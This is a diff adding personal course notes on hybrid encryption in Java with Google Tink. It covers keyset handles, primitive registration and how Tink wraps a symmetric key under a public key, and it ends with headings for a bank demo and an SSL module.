+		KeysetHandle handle = KeysetHandle.generateNew(implementation);
+	Obviously, we're working with keys ("Keyset" in KeysetHandle), but really, as we've already called out more than once, we really want to work with a set of keys since we want to anticipate key rotation
+	The word "handle" is there to indicate that we don't actually work with keys directly, but instead with an interface through which we can encrypt and decrypt information
+	We've been dealing with keys for so long in this course that it may seem like an annoyance, but if you remember way back early on in the course, we state that his would be our final goal, to be able to encrypt, decrypt, sign and verify without touching the keys at all
+	So that should be enough to start looking at some code
+		HybridConfig.register()
+		KeysetHandle handle = CleartextKeysetHandle.read(keysetReader);
+		PublicKeysetHandle pub = handle.getPublic...
+		HybridEncrypt encrypt = HybridEncryptConfig.getPrimitive(pub)
+		byte[] ciphertext = pub.encrypt(plaintext)
+	To use a primitive, we have to activate it, which can be done once per running application. Basically, we call the name of the primitive, config.register(). In our case, we do HybridConfig.register()
+	After that, we'll need a new KeysetHandle. If we don't have a keyset, then we can generate one by calling generateNew() or we can use different APIs to read them from a file or from a remote source
+	Note a key difference here though, which is that we're going to specify a primitive implementation when generating the keyset. That means  that we're going to get a key whose usage is targeted at the specific operation we want to perform
+	With the right KeysetHandle in hand, we can get the appropriate primitive on in other words,  the appropriate operation. Since we want to do hybrid encryption, we'd extract the PublicKeysetHandle from our keyset and then call getPrimitive
+	After that, it's as simple as calling encrypt()
+	What google tink will do behind the scenes is similar to what we did ourselves earlier. It generates a symmetric key, encrypts the payload and then uses the public key to encrypt the symmetric key
+
+6.14 - Hybrid Encryption with Google Tink
+	(demo of Terracotta bank - code looks much simpler)
+
+6.15 - Review + the Backbone of the Secure Internet
+	Google Tink makes it harder to make the wrong security decision
+	In our final module, we're going ot see how to take all these principles of keys, key stores, signing, and encryption, including hybrid encryption and see how they apply in java to the backbone protocol of the secure internet, SSL
